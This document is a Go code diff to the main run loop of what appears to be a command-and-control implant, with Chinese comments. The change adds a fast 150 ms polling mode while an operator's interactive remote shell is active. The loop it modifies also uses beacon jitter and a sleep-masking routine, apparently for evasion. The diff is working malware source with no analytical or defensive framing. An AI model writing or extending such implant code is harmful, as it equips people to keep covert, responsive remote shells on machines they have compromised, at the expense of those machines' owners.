@@ -2,13 +2,25 @@ package main
 
 import (
 	"implant/core/app"
-	"implant/core/debuglog"
+	"implant/core/commands"
 	"implant/core/communication"
 	"implant/core/config"
+	"implant/core/debuglog"
 	"implant/core/reconnect"
 	"math/rand"
 	"time"
 )
+
+// fastPollInterval 交互式终端活跃时使用的轮询间隔。
+//
+// 轮询传输下"一个字符 = 一条命令 = 一轮 GET"，按信标节奏（sleep，常见 5s）轮询
+// 会让终端像哑终端：敲 5 个字符要等 25 秒。本机确实有交互会话时降到 150ms，
+// 会话结束立即回落——只在这段时间多付请求频率，而不是全程。
+const fastPollInterval = 150 * time.Millisecond
+
+// fastPollActive 记录当前是否处于"交互会话快轮询"状态，只用于状态切换时打一行
+// 日志（否则每 150ms 一条日志会把客户端日志刷满）。
+var fastPollActive bool
 
 // heartbeatStarter 由需要独立心跳的传输实现（内部管理 ticker，重连时先停旧再起新）
 type heartbeatStarter interface {
@@ -136,6 +148,18 @@ func runLoop() {
 			interval := pt.PollInterval()
 			if interval < 1000*time.Millisecond {
 				interval = config.WaitTime // 防御：传输未给有效间隔时回退 sleep 基准
+			}
+			// 交互式终端活跃 → 快轮询（见 fastPollInterval）。用会话活跃状态而不是
+			// 操作员开关：终端一关，下一轮就自动回落到信标节奏。
+			if commands.InteractiveShellActive() && interval > fastPollInterval {
+				interval = fastPollInterval
+				if !fastPollActive {
+					fastPollActive = true
+					debuglog.Printf("⚡ [终端] 交互会话活跃，轮询间隔降至 %v（会话结束自动恢复）\n", fastPollInterval)
+				}
+			} else if fastPollActive && !commands.InteractiveShellActive() {
+				fastPollActive = false
+				debuglog.Printf("🕐 [终端] 交互会话结束，轮询间隔恢复为 %v\n", interval)
 			}
 			app.SleepMask(app.Jittered(interval))
 		} else {
